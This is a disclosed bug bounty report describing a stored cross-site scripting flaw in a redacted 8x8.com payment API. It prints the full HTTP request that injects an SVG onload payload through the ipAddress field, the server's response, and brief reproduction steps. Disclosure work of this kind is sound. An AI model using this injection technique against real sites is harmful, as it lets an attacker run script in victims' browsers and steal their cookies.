# Stored xss at https://█.8x8.com/api/█/ID

## Report Details
- **Report ID**: 2078490
- **URL**: https://hackerone.com/reports/2078490
- **State**: Closed
- **Severity**: high
- **Submitted**: 2023-07-20T23:46:09.074Z
- **Disclosed**: 2023-10-30T17:18:43.999Z

## Reporter
- **Username**: pentestor
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: 8x8-bounty

## Vulnerability Information
## Summary:
hey , 
i found a stored  xss at `https://██████.8x8.com/api/██████mentInfoById/ID` , when i analysis javascript code i understand user can modify her ip address with endpoint `https://███.8x8.com/api/patchPaymentMethod/ID` , next point i understand when we open    `https://████████.8x8.com/api/██████████mentInfoById/ID` server set `Content-Type: text/html;charset=UTF-8` , this was interesting point , then i modify ip address with this request:
```
POST /api/patchPaymentMethod/█████████ HTTP/2
Host: ███.8x8.com
Cookie: ajs_anonymous_id=13b1ab4c-87f5-4dbb-967b-066b6d7efd1e; _gcl_au=1.1.275521026.1689699475; _fbp=fb.1.1689701587161.1730712436; __cf_bm=MloB4oUJmeviUXpE1GRUn8TtqbE4CwVEttuZr9tUrOQ-1689845706-0-AWJDz0q9F1c0CmKcbShEYyS7Qqsfd88Gb9W9YsIXUoHhnP/aHA+wGRccAnb8GxD1HBTGXJ71aHh7XzOojjLP/sg=
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Content-Type: application/json
Content-Length: 112

{
              "ipAddress": "<svg on onload=(alert)(document.domain)>",
"callBackURL":"dssdsd"
            }
```
now i get response : 
```
HTTP/2 400 Bad Request
Date: Thu, 20 Jul 2023 23:30:32 GMT
Content-Length: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Expires: 0
Pragma: no-cache
Strict-Transport-Security: max-age=31536000 ; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-Gk-Traceid: e97be98a-d5e6-4fce-a6a5-4d5f6d28b02a
X-Regional-Id: usw2-gk-65dc71e19a79
X-Served-Epoch: 1689895832189
X-Xss-Protection: 1; mode=block
Cf-Cache-Status: DYNAMIC
Set-Cookie: __cf_bm=7dklJH6I0nIayzUSs2ga_6bhxG_AZTclwDwaUIaKeBQ-1689895832-0-AQvIhwqEdRP3rLeIkHe1u4gqwspbam+/6s7/WEIOEsrvvvpuOSaaBNi36GsWEVNOGQWbRBz4Z89eCgjOTdOWGv0=; path=/; expires=Fri, 21-Jul-23 00:00:32 GMT; domain=.8x8.com; HttpOnly; Secure; SameSite=None
Server: cloudflare
Cf-Ray: 7e9efe156adf41f9-EWR


```

then i check url : https://█████████.8x8.com/api/██████████mentInfoById/████ 
and i seen ip address updated and █████load successfully executed : 
█████████
  
## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. open url : https://███.8x8.com/api/████mentInfoById/█████ 
  1. you can see my injected ████████load executed :D 

## Supporting Material/References:
███

## Impact

Stealing cookies and executed javascript in victim browser

## Attachments
No attachments
